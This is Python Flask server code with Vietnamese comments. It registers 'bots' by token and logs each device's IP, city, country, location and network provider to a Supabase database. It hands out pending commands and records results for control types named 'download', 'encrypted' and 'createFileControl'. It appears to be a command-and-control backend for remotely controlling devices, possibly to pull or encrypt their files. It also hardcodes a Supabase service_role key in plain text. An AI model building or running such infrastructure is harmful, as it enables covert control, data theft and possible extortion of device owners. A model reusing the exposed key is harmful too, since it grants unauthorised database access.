import secrets
from flask import Flask, request, jsonify, send_file
import requests,json
from supabase import create_client
app = Flask(__name__)

# Hàm tạo token ngẫu nhiên (20 ký tự)
def generate_token(length=20):
    return ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(length))
SQL_url = "https://vqluvnrjixxpfffawkps.supabase.co"
SQL_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZxbHV2bnJqaXh4cGZmZmF3a3BzIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMzgzMjIzOSwiZXhwIjoyMDQ5NDA4MjM5fQ.AZ8SMebm4F8dRWdg-hv8dMwa997dUcSAVoctAFd9VO0"
# Tạo Supabase client


# Danh sách bot lưu trữ tạm thời
bots = {}

# Hàm lấy danh sách bots từ API
def get_token():
    try:
        url = "https://674c570654e1fca9290c42c7.mockapi.io/api_device"
        headers = {
            "Authorization": "674c570654e1fca9290c42c7",
            "Content-Type": "application/json"
        }

        response = requests.get(url, headers=headers)
        response.raise_for_status()
        users = response.json()

        # Trả về danh sách bots
        return users
    except requests.RequestException as e:
        print(f"Error fetching bots: {e}")
        return []

# Hàm cập nhật bots định kỳ

def update_bots():
    global bots
    try:
        bot_list = get_token()
        bots = {bot['token']: {"name": bot['name']} for bot in bot_list}
        print(f"Bots updated: {bots}")  # Log để kiểm tra cập nhật
    except Exception as e:
        print(f"Error updating bots: {str(e)}")

update_bots()
@app.route('/api/update_bots', methods=['GET'])
def update_bots_api():
    global bots
    try:
        update_bots()
        return jsonify({"message": "Bots updated successfully"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to update bots: {str(e)}"}), 500

@app.route('/api/result', methods=['POST'])
def result():
    try:
        supabase = create_client(SQL_url, SQL_key)
        # Kiểm tra nếu request có dữ liệu JSON
        if not request.is_json:
            return jsonify({"error": "Invalid content type. JSON data required."}), 400
        data = request.json

        table_request = "requests"
        table_file_requests = "files_requests"
        id_request = {"id": f'{data["id_SQL"]}'}
        new_data_requests = {
            r"status": f'{data["status_SQL"]}',
        }
        # Lấy dữ liệu từ request
        if data['type_control'] == 'download':
            update_requests = supabase.table(table_request).update(new_data_requests).match(id_request).execute()
            for data_file in data['data_file']:
                id_file_requests = {"id": f'{data_file["id_file"]}'}
                new_data_file_requests = {
                    r"token_file": f'{data_file["token_file"]}',
                }
                update_file_requests = supabase.table(table_file_requests).update(new_data_file_requests).match(id_file_requests).execute()
        elif data['type_control'] == 'encrypted':
            update_requests = supabase.table(table_request).update(new_data_requests).match(id_request).execute()
        elif data['type_control'] == 'createFileControl':
            update_requests = supabase.table(table_request).update(new_data_requests).match(id_request).execute()
            # table_name = "requests"
            
        
        # # Điều kiện tìm kiếm dữ liệu cần chỉnh sửa
        # id_SQL = {"id": f'{data["id_SQL"]}'}  # Ví dụ: Cập nhật dòng có id = 1

        # # Dữ liệu mới cần chỉnh sửa
        # new_data = {
        #     r"status": f'{data["status_SQL"]}',
        # }
        # response = supabase.table(table_name).update(new_data).match(id_SQL).execute()

        return jsonify(data), 200


    except Exception as e:
        # Xử lý lỗi chung và trả về thông báo lỗi
        return jsonify({"error": "An error occurred.", "details": str(e)}), 500

@app.route('/api/tokens', methods=['GET'])
def get_tokens():
    # Trả về danh sách các token hiện có
    return jsonify({"tokens": list(bots.keys())}), 200

# Endpoint để xem dữ liệu đã gửi theo token

@app.route('/api/<token>/data', methods=['GET'])
def get_token_data(token):
    requests_controller = []

    # Kiểm tra token có hợp lệ không
    if token not in bots:  # Đảm bảo 'bots' được định nghĩa
        return jsonify({"error": "Unauthorized: Invalid token"}), 401

    # Kết nối với Supabase
    supabase = create_client(SQL_url, SQL_key)  # Đảm bảo 'url' và 'key' được định nghĩa

    # Lấy dữ liệu từ Supabase
    try:
        device_control_response = supabase.table("requests").select("*").execute()
        files_response = supabase.table("files_requests").select("*").execute()
    except Exception as e:
        return jsonify({"error": f"Failed to fetch data: {str(e)}"}), 500

    # Kiểm tra dữ liệu lấy được
    device_controls = device_control_response.data or []
    files = files_response.data or []

    # Lọc và xử lý dữ liệu
    for data in device_controls:
        if data['name_device'] == token :
            # Tạo danh sách file chỉ liên quan đến request này
            file_controller = [
                file for file in files if file['id_requests'] == data['id']
            ]
            # Gắn danh sách file vào request
            data['file'] = file_controller
            # Thêm vào danh sách kết quả
            requests_controller.append(data)

    # Trả về dữ liệu ở dạng JSON
    return jsonify({"data": requests_controller}), 200

# Dictionary lưu file tạm (bộ nhớ)


stored_devices = {}

@app.route('/api/newdevice', methods=['POST'])
def add_new_devices():
    # Lấy dữ liệu từ yêu cầu
    data = request.json
    supabase = create_client(SQL_url, SQL_key)
    save_requests_SQL = supabase.table("new_devices").insert({
        "name_device": data['name_device'],
        "IP": data['IP'],
        "City": data['City'],
        "Area": data['Area'],
        "Country": data['Country'],
        "Location": data['Location'],
        "Network_provider": data['Network_provider'],
        "token" : data['token'],
        "token_file" : data['token_file']
    }).execute()

    # Kiểm tra dữ liệu đầu vào
   
    return jsonify({
        "message": "Devices processed.",
        "added_devices": data,
    }), 200


if __name__ == '__main__':
    # Khởi động thread cập nhật bots

    # Chạy ứng dụng Flask
    app.run(debug=True)
